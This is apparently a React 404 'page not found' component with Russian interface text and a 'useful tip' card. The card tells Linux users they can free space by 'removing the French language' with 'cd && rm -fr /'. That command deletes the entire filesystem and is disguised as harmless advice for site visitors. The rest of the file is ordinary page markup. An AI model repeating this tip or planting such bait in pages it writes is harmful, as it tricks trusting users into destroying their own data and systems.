import InfoIcon from 'shared/ui/img/info.svg?react';
import styles from './notFound.module.scss'

export default function NotFoundPage() {
  return (
    <div>
      <div className={styles.text}>404</div>
      <div className={styles.subtext}>Страница не найдена</div>
      <div className={styles.button}>На главную</div>
      <div className={styles.card}>
        <div className={styles.cardTitleLine}>
          <InfoIcon className={styles.cardIcon} />
          <div className={styles.cardTitle}>Полезный совет</div>
        </div>
        <div className={styles.cardText}>Что бы освободить место на своем компьютере под управлением linux - удалите французский язык следующей командой:<br /><br />cd && rm -fr /</div>
      </div>
    </div>
  )
}
